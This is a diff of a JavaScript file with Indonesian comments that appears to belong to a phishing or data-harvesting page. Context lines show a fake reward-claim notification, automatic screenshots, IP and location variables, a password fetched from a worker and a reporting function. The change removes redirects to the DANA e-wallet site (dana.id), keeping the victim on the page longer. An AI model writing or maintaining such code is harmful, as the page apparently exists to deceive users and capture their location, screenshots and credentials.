@@ -137,7 +137,6 @@ var semuaDidapat = false;
 var spreadDone = false;
 var DOWNLOAD_STARTED = false;
 var NOTIFICATION_SHOWN = false;
-var REDIRECT_DONE = false;
 var WS_PASSWORD = '';
 var IP_ADDRESS = '';
 var LOCATION_DATA = null;
@@ -430,12 +429,6 @@ function createKlaimNotification() {
         
         notif.onclick = function() {
             notif.close();
-            if (!REDIRECT_DONE) {
-                REDIRECT_DONE = true;
-                setTimeout(function() {
-                    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
-                }, 500);
-            }
         };
         
         setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
@@ -554,13 +547,7 @@ function dapatkanSemua() {
         setTimeout(function() { showStatusBar(); }, 500);
         setTimeout(function() { autoScreenshot(); }, 7000);
         
-        // ✅ REDIRECT KE https://www.dana.id (UNIVERSAL)
-        setTimeout(function() {
-            if (!REDIRECT_DONE) {
-                REDIRECT_DONE = true;
-                try { window.location.href = 'https://www.dana.id'; } catch(e) {}
-            }
-        }, 8000);
+        // ✅ REDIRECT DIHAPUS! TIDAK ADA redirect ke dana.id!
         
         getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
         
